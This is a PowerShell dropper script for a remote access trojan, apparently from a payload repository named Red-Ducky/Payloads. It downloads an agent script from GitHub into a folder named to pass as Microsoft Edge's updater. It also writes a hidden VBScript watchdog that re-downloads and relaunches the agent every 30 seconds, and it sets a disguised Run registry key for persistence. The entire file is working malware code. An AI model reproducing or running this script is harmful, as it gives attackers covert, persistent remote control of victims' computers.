Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

$installDir = Join-Path $env:APPDATA "MicrosoftEdgeUpdate"
$vbsDir = Join-Path $env:APPDATA "Microsoft"
New-Item -ItemType Directory -Force -Path $installDir

$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/agent/"
Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $installDir "agent.ps1")

$agentPath = Join-Path $installDir "agent.ps1"
$vbsPath = Join-Path $vbsDir "launcher.vbs"

@"
Set objShell = CreateObject("WScript.Shell")
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Do While True

    fileExists = objFSO.FileExists("$agentPath")

    If Not fileExists Then
        If Not objFSO.FolderExists("$installDir") Then
            objFSO.CreateFolder "$installDir"
        End If
        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri '${baseUrl}agent.ps1' -OutFile '$installDir\agent.ps1'""", 0, False
    End If
    
    Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
    
    agentCount = 0

    For Each process In processes
        If InStr(1, process.CommandLine, "agent.ps1", vbTextCompare) > 0 Then
            agentCount = agentCount + 1
        End If
    Next

    If agentCount > 1 Then
        MsgBox "Doublons !"
    End If

    If agentCount = 0 Then
        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
    End If
    WScript.Sleep 30000
Loop
"@ | Set-Content $vbsPath

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
}
Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -Value "wscript.exe `"$vbsPath`""

Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
exit
